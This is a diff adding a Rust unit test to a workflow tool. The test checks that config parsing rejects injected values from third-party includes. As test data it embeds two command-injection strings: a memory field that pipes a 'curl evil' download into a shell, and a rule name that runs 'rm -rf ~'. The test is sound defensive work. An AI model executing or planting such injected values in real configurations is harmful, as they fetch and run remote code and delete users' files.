@@ -8373,3 +8373,45 @@ fn transform_n_chunking_substitutes_the_split_variable_everywhere() {
     let map_a = config.get_rule("process_a").expect("values chunk a");
     assert_eq!(map_a.input.to_vec(), vec!["data/a.txt".to_string()]);
 }
+
+#[test]
+fn config_validate_enforces_per_rule_field_validation() {
+    // #523: the run path calls WorkflowConfig::validate — never the
+    // type-state Rule::validate — so per-rule field checks must fan out
+    // from it. Hostile values from a third-party [[include]] previously
+    // reached shell/docker/scheduler rendering unchecked.
+    let toml = r#"
+[workflow]
+name = "hostile"
+
+[[rules]]
+name = "gen"
+output = ["out.txt"]
+shell = "echo hi > {output}"
+
+[rules.resources]
+memory = "4G; curl evil|sh"
+"#;
+    // `WorkflowConfig::parse` validates internally, so the hostile value is
+    // rejected at parse time — before any expansion or rendering.
+    let err = WorkflowConfig::parse(toml).expect_err("hostile memory must be rejected");
+    assert!(
+        err.to_string().contains("invalid memory format"),
+        "hostile memory must be rejected: {err}"
+    );
+
+    let toml = r#"
+[workflow]
+name = "badname"
+
+[[rules]]
+name = "gen; rm -rf ~"
+output = ["out.txt"]
+shell = "echo hi > {output}"
+"#;
+    let err = WorkflowConfig::parse(toml).expect_err("hostile rule name must be rejected");
+    assert!(
+        err.to_string().contains("invalid characters"),
+        "hostile rule name must be rejected: {err}"
+    );
+}
